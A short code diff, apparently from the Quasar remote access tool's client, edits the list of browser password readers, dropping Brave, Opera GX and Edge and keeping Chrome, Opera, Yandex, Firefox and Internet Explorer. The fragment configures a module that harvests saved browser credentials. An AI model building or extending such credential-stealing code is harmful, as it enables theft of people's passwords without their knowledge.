@@ -32,11 +32,8 @@ namespace Quasar.Client.Messages
 
             var passReaders = new IAccountReader[]
             {
-                new BravePassReader(),
-                new ChromePassReader(),
-                new OperaPassReader(),
-                new OperaGXPassReader(),
-                new EdgePassReader(),
+                new ChromePassReader(), 
+                new OperaPassReader(), 
                 new YandexPassReader(), 
                 new FirefoxPassReader(), 
                 new InternetExplorerPassReader(), 
